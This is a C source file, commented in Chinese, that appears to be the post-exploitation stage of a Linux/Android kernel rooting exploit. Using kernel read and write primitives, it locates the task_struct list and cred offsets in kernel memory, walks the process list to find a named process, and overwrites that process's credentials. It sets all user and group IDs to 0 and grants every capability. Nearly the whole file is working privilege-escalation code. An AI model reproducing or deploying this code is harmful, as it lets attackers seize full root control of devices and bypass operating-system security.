#include <unistd.h>
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <fcntl.h>              /* Obtain O_* constant definitions */
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdbool.h>

#include "common.h"
#include "getroot.h"
#include "kallsym.h"


/*
 * 函数: get_sched_class_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回sched_class字段在task_struct结构体的偏移，失败返回0
 * 说明: 搜索 task_struct 中的 struct sched_class sched_class 字段，返回偏移量
 *       在定位 sched_class 时，由于前面的成员 int prio, static_prio, normal_prio;
 *       等于当前进程的优先级，       因此可以作为标记来搜索
 * 
 * struct task_struct{
 *     ...
 *     int prio, static_prio, normal_prio;
 *     unsigned int rt_priority;
 *     // 进程调度类 指向全局变量 fair_sched_class
 *     const struct sched_class *sched_class;
 *     struct sched_entity se;
 *     struct sched_rt_entity rt;
 *     ...
 * };
 */
int get_sched_class_offset(void *task, int len)
{
	int i;
	int offset = 0;
	unsigned int *step = (unsigned int*)task;
	int count = len / sizeof(int);
	int priority = get_process_priority() + 120;

	for (i = 0; i < count; i++) {
		if (step[i] == priority && (i + 3 < count)) {
			//printf(">>> [%s] 0x%x, 0x%x, 0x%x, 0x%x\n",
			//			__FUNCTION__, step[i], step[i+1], step[i+2], step[i+3]);
			if (step[i+1] == priority && step[i+2] == priority){
				offset = (unsigned long)(&step[i+4]) - (unsigned long)task;
				//printf(">>> [%s] find sched_class offset: 0x%x\n", __FUNCTION__, offset);
				break;
			}
		}
	}

	return offset;
}

/*
 * 函数: get_tasks_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回tasks字段在task_struct结构体的偏移，失败返回-1
 * 说明: 搜索 task_struct 中的 struct list_head tasks 字段，返回偏移量
 *       在定位 tasks 时，由于下面的成员 pushable_tasks.prio 在手机上总是0x8c，
 *       因此可以作为标记来搜索。同时在prio前后几个字段       均为内核函数指针也可作为判断
 * 
 * struct task_struct{
 *     ...
 *     struct list_head tasks;
 * #ifdef CONFIG_SMP
 *     struct plist_node pushable_tasks;
 *     struct rb_node pushable_dl_tasks;
 * #endif
 *     ...
 * }
 * struct plist_node {
 *     int prio;
 *     struct list_head	 prio_list;
 *     struct list_head	 node_list;
 * };
 */
int get_tasks_offset(void *task, int len)
{
	int i;
	int offset = -1;
	unsigned long *step = task;
	int count = len / sizeof(long);

	for (i = 0; i < count; i++) {
		if (step[i] == 0x8c && (i + 3 < count)) {
			//printf(">>> [%s] 0x%lx, 0x%lx, 0x%lx, 0x%lx, 0x%lx, 0x%lx\n",
			//			__FUNCTION__, step[i-2], step[i-1], step[i], step[i+1], step[i+2], step[i+3]);
			if (step[i-2] & KERNEL_ADDR_START &&
				step[i-1] & KERNEL_ADDR_START &&
				step[i+1] & KERNEL_ADDR_START &&
				step[i+2] & KERNEL_ADDR_START ) {
				offset = (void *)&step[i-2] - task;
				//printf(">>> [%s] find tasks offset: 0x%x\n", __FUNCTION__, offset);
				break;
			}
		}
	}

	return offset;
}

/*
 * 函数: verify_cpu_timer
 * 参数: cpu_timer, 指向存放 struct list_head cpu_timers 结构体数据
 * 返回: 成功返回1，失败返回0
 * 说明: 判断 cpu_timer 是否为空链表
 *       cpu_timer->next == cpu_timer->prev，且 cpu_timer->next 为内核地址
 *       
 */
int verify_cpu_timer(struct list_head* cpu_timer)
{
    if (cpu_timer->next != cpu_timer->prev)
        return 0;

    if ((unsigned long)cpu_timer->next < KERNEL_ADDR_START ||
		(unsigned long)cpu_timer->next > KERNEL_ADDR_END)
        return 0;

    return 1;
}

/*
 * 函数: verify_cred
 * 参数: cred_ptr, 指向存放 struct cred 结构体数据
 * 返回: 成功返回 true, 失败返回 false
 * 说明: 验证 cred_ptr 存放的是否是 cred 结构数据
 */
int verify_cred(unsigned long cred_ptr)
{
	unsigned int uid = 0;

	if (cred_ptr < KERNEL_ADDR_START || kernel_read((void*)(cred_ptr + sizeof(int)), &uid, sizeof(int)))
		return 0;

	return uid == getuid();
}

/*
 * 函数: get_cred_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回cred字段在task_struct结构体的偏移，失败返回-1
 * 说明: 搜索task_struct中的struct cred字段，返回偏移量
 *       根据cpu_timers中链表为空和cred、real_cred相等作为特征来搜索
 *
 * struct task_struct{
 *     ...
 *     struct list_head cpu_timers[3];
 *     const struct cred __rcu *ptracer_cred; // 可能没有
 *     const struct cred __rcu *real_cred;
 *     const struct cred __rcu *cred;
 *     char comm[TASK_COMM_LEN];
 *     ...
 * }
 */
int get_cred_offset(void *task, int len)
{
	int i;
	int offset = -1;

	for (i = 0; i < len; i += sizeof(void*)) {
		struct task_struct_partial* t = (struct task_struct_partial*)(task + i);
		if (verify_cpu_timer(&t->cpu_timers[0])
			&& verify_cpu_timer(&t->cpu_timers[1])
			&& verify_cpu_timer(&t->cpu_timers[2])
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_ADDR_START)
			&& (*(unsigned long*)t->comm != 0)
			&& (*(unsigned long*)t->comm < KERNEL_ADDR_START)){
			offset = (void *)&t->cred - task;
			//printf(">>> [%s] find cred offset: 0x%x\n", __FUNCTION__, offset);
			return offset;
		}
	}

	for (i = 0; i < len; i += sizeof(void*)) {
		struct task_struct_partial_ptracer* t = (struct task_struct_partial_ptracer*)(task + i);
		if (verify_cpu_timer(&t->cpu_timers[0])
			&& verify_cpu_timer(&t->cpu_timers[1])
			&& verify_cpu_timer(&t->cpu_timers[2])
			&& (t->ptracer_cred == 0)
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_ADDR_START)
			&& (*(unsigned long*)t->comm != 0)
			&& (*(unsigned long*)t->comm < KERNEL_ADDR_START)){
			offset = (void *)&t->cred - task;
			//printf(">>> [%s] find cred offset: 0x%x\n", __FUNCTION__, offset);
			return offset;
		}
	}

	printf(">>> [%s] can not find cred offset\n", __FUNCTION__);

	return offset;
}

/*
 * 函数: get_cred_offset_by_name
 * 参数: task, 指向存放 struct task_struct 结构体数据; name, 进程名称
 * 返回: 成功返回cred偏移, 失败返回-1
 * 说明: 通过当前进程名称，获取cred相对task_struct结构偏移
 */
int get_cred_offset_by_name(void* task, int len, char* name)
{
	int i = 0;
    char taskname[TASK_COMM_LEN] = {0,};
	unsigned char* task_ptr = (unsigned char*)task;
    unsigned n = CMP_MIN(strlen(name)+1, TASK_COMM_LEN);
    memcpy(taskname, name, n);

    for (i = 0; i < len; i += sizeof(void*)) {
        if (0 == memcmp(task_ptr+i, taskname, n) && verify_cred(*(unsigned long*)(task_ptr+i-sizeof(void*)))){
            return i-sizeof(void*);
        }
    }

    return -1;
}

/*
 * 函数: find_task_by_task
 * 参数: self_task, 已知task指针; self_name, 已知task名称;
 *       find_task, 存放要查找的task指针; find_name, 要查找的task名称
 * 返回: 成功返回0，失败返回-1
 * 说明: 根据已知task和要查找的task的名称，查找其task指针
 */
int find_task_by_task(void *self_task, char *self_name, void *find_task, char *find_name)
{
	int result = -1;
	int cred_off = -1;
	int tasks_off = -1;
	int len = ONE_PAGE_SIZE;
	struct list_head *tasks = NULL;
	char* comm = NULL;
	void *next_task = self_task;
	void *task = malloc(len);

	if(!task){
		printf(">>> [%s] malloc failed!\n", __FUNCTION__);
		return result;
	}

	if (self_task == NULL || find_task == NULL || find_name == NULL) {
		return result;
	}

	/* 根据内核中的task_struct的双向链表struct list_head tasks来搜索进程 */
	while(1) {
		memset(task, 0 , len);
		/* 读取task_struct结构体内容 */
		if(kernel_read(next_task, task, len) < 0){
			printf(">>> [%s] kernel_read failed! 0x%lx\n", __FUNCTION__, (unsigned long)next_task);
			return result;
		}

		if (tasks_off < 0) {
			/* 搜索task中的struct list_head tasks，返回偏移 */
			tasks_off = get_tasks_offset(task, len);
			if (tasks_off < 0){
				printf(">>> [%s] get_tasks_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] tasks_off = 0x%x\n", __FUNCTION__, tasks_off);
		}
        tasks = task + tasks_off;

		if (cred_off < 0) {
			/* 搜索stask中的struct cred cred，返回偏移 */
			//cred_off = get_cred_offset_by_name(task, len, self_name);
			cred_off = get_cred_offset(task, len);
			if (cred_off < 0){
				printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);
		}
		comm = (char*)task + cred_off + sizeof(void*);
		//printf(">>> [%s] task name: %s\n", __FUNCTION__, comm);
		//printf(">>> [%s] tasks->next = %p; tasks->prev = %p\n", __FUNCTION__, tasks->next, tasks->prev);

		/* 根据进程task_struct中的comm字段判断进程 */
		if (strcmp(find_name, comm) == 0) {
			*(unsigned long*)find_task = (unsigned long)next_task;
			result = 0;
			break;
		}
		/* 搜索下一个进程的task_struct */
		next_task = (void *)((char*)tasks->next - tasks_off);
		//printf(">>> [%s] next_task = %p\n", __FUNCTION__, next_task);
		if (next_task == self_task) {
			printf(">>> [%s] can not find task\n", __FUNCTION__);
			break;
		}
	}
	free(task);

	return result;
}

/*
 * 函数: patch_cred_by_task
 * 参数: task, 已知task指针; len, 搜索信息长度; name, 已知task名称;
 * 返回: 成功返回cred偏移，失败返回-1
 * 说明: 修改指定task的cred内容
 */
int patch_cred_by_task(void *task, int len, char *name)
{
	int cred_off = -1;
	char* comm = NULL;
	struct cred cred;
	void *cred_addr = NULL;

	if (name == NULL || task == NULL) {
		return -1;
	}

	cred_off = get_cred_offset_by_name(task, len, name);
	if (cred_off < 0){
		printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
		return -1;
	}
	//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);

	cred_addr = (void *)(*(unsigned long *)(task + cred_off));
	/* 读取进程cred内容 */
	if (kernel_read(cred_addr, &cred, sizeof(struct cred)) < 0) {
		printf(">>> [%s] kernel_read fail\n", __FUNCTION__);
		return -1;
	}

	cred.uid = 0;
	cred.gid = 0;
	cred.suid = 0;
	cred.sgid = 0;
	cred.euid = 0;
	cred.egid = 0;
	cred.fsuid = 0;
	cred.fsgid = 0;
	cred.cap_inheritable.cap[0] = 0xffffffff;
	cred.cap_inheritable.cap[1] = 0xffffffff;
	cred.cap_permitted.cap[0] = 0xffffffff;
	cred.cap_permitted.cap[1] = 0xffffffff;
	cred.cap_effective.cap[0] = 0xffffffff;
	cred.cap_effective.cap[1] = 0xffffffff;
	cred.cap_bset.cap[0] = 0xffffffff;
	cred.cap_bset.cap[1] = 0xffffffff;
	cred.cap_ambient.cap[0] = 0xffffffff;
	cred.cap_ambient.cap[1] = 0xffffffff;

	/* 修改进程cred内容 */
	if(kernel_write(cred_addr, &cred, sizeof(struct cred)) < 0){
		printf(">>> [%s] kernel_write failed!\n", __FUNCTION__);
		return -1;
	}

	return cred_off;
}

/*
 * 函数: patch_cred_by_init_task
 * 参数: init_task, 已知init_task指针; len, 搜索信息长度; name, 已知task名称;
 * 返回: 成功返回cred偏移，失败返回-1
 * 说明: 修改指定task的cred内容
 */
int patch_cred_by_init_task(void *init_task, char *find_name)
{
	int result = -1;
	int cred_off = -1;
	int tasks_off = -1;
	int len = ONE_PAGE_SIZE;
	struct list_head *tasks = NULL;
	char* comm = NULL;
	void *next_task = init_task;
	void *task = malloc(len);

	if(!task){
		printf(">>> [%s] malloc failed!\n", __FUNCTION__);
		return result;
	}

	if (init_task == NULL || find_name == NULL) {
		return result;
	}

	/* 根据内核中的task_struct的双向链表struct list_head tasks来搜索进程 */
	while(1) {
		memset(task, 0 , len);
		/* 读取task_struct结构体内容 */
		if(kernel_read(next_task, task, len) < 0){
			printf(">>> [%s] kernel_read failed! 0x%lx\n", __FUNCTION__, (unsigned long)next_task);
			return result;
		}

		if (tasks_off < 0) {
			/* 搜索task中的struct list_head tasks，返回偏移 */
			tasks_off = get_tasks_offset(task, len);
			if (tasks_off < 0){
				printf(">>> [%s] get_tasks_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] tasks_off = 0x%x\n", __FUNCTION__, tasks_off);
		}
        tasks = task + tasks_off;

		if (cred_off < 0) {
			/* 搜索stask中的struct cred cred，返回偏移 */
			//cred_off = get_cred_offset_by_name(task, len, self_name);
			cred_off = get_cred_offset(task, len);
			if (cred_off < 0){
				printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);
		}
		comm = (char*)task + cred_off + sizeof(void*);
		//printf(">>> [%s] task name: %s\n", __FUNCTION__, comm);
		//printf(">>> [%s] tasks->next = %p; tasks->prev = %p\n", __FUNCTION__, tasks->next, tasks->prev);

		/* 根据进程task_struct中的comm字段判断进程 */
		if (strcmp(find_name, comm) == 0) {
			//*(unsigned long*)find_task = (unsigned long)next_task;
			void *cred_addr = (void *)(*(unsigned long *)(task + cred_off));
			struct cred cred;
			/* 读取进程cred内容 */
			if (kernel_read(cred_addr, &cred, sizeof(struct cred)) < 0) {
				printf(" kernel_read fail\n");
				break;
			}

			cred.uid = 0;
			cred.gid = 0;
			cred.suid = 0;
			cred.sgid = 0;
			cred.euid = 0;
			cred.egid = 0;
			cred.fsuid = 0;
			cred.fsgid = 0;

			cred.cap_inheritable.cap[0] = 0xffffffff;
			cred.cap_inheritable.cap[1] = 0xffffffff;
			cred.cap_permitted.cap[0] = 0xffffffff;
			cred.cap_permitted.cap[1] = 0xffffffff;
			cred.cap_effective.cap[0] = 0xffffffff;
			cred.cap_effective.cap[1] = 0xffffffff;
			cred.cap_bset.cap[0] = 0xffffffff;
			cred.cap_bset.cap[1] = 0xffffffff;

			/* 修改进程cred内容 */
			if(kernel_write(cred_addr, &cred, sizeof(struct cred)) < 0){
				printf("   kernel_write failed!\n");
			}
			result = 0;
			break;
		}
		/* 搜索下一个进程的task_struct */
		next_task = (void *)((char*)tasks->next - tasks_off);
		//printf(">>> [%s] next_task = %p\n", __FUNCTION__, next_task);
		if (next_task == init_task) {
			printf(">>> [%s] can not find task\n", __FUNCTION__);
			break;
		}
	}
	free(task);

	return result;
}

